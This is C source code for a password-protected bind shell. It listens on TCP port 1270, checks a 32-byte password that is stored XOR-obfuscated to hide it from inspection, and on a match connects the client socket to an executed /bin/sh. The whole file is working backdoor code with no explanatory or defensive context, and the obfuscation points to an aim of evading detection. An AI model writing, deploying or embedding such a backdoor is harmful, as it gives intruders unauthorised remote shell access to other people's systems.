#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "xor_strings.h"

// the password to login to the shell
// static const char o_password[] = orig_password;

bool check_password(const char* p_password)
{
// char pass[33] =
// {
    // orig_password[0], orig_password[1], orig_password[2], orig_password[3], orig_password[4],
    // orig_password[5], orig_password[6], orig_password[7], orig_password[8], orig_password[9],
    // orig_password[10], orig_password[11], orig_password[12], orig_password[13], orig_password[14],
    // orig_password[15], orig_password[16], orig_password[17], orig_password[18], orig_password[19],
    // orig_password[20], orig_password[21], orig_password[22], orig_password[23], orig_password[24],
    // orig_password[25], orig_password[26], orig_password[27], orig_password[28], orig_password[29],
    // orig_password[30], orig_password[31], 0
    // };

    /*XOR Strings*/
    char pass[32] = {};
    XOR_STRING31(pass, orig_password, 0xaa);

    return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;
     /*XOR Strings*/
// validate the password
// return memcmp(pass, p_password, 32) != 0;
}


int main(int p_argc, char* p_argv[])
{
    (void)p_argc;
    (void)p_argv;

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1)
    {
        fprintf(stderr, "Failed to create the socket.");
        return EXIT_FAILURE;
    }

    struct sockaddr_in bind_addr = {};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    bind_addr.sin_port = htons(1270);

    int bind_result = bind(sock, (struct sockaddr*) &bind_addr,
        sizeof(bind_addr));
    if (bind_result != 0)
    {
        perror("Bind call failed");
        return EXIT_FAILURE;
    }

    int listen_result = listen(sock, 5);
    if (listen_result != 0)
    {
        perror("Listen call failed");
        return EXIT_FAILURE;
    }
    
    while (true)
    {
        int client_sock = accept(sock, NULL, NULL);
        if (client_sock < 0)
        {
            perror("Accept call failed");
            return EXIT_FAILURE;
        }

        int child_pid = fork();
        if (child_pid == 0)
        {
            // read in the password
            char password_input[sizeof(orig_password)] = { 0 };
            int read_result = read(client_sock, password_input,
                sizeof(password_input));
            if (read_result < (int)(sizeof(orig_password) - 1))
            {
                close(client_sock);
                return EXIT_FAILURE;
            }

            if (check_password(password_input))
            {
                printf("Failed");
                close(client_sock);
                return EXIT_FAILURE;
            }
            printf("Password Correct");
            dup2(client_sock, 0);
            dup2(client_sock, 1);
            dup2(client_sock, 2);
        
            char* empty[] = { NULL };
            execve("/bin/sh", empty, empty);
            close(client_sock);
            return EXIT_SUCCESS;
        }

        close(client_sock);
    }
}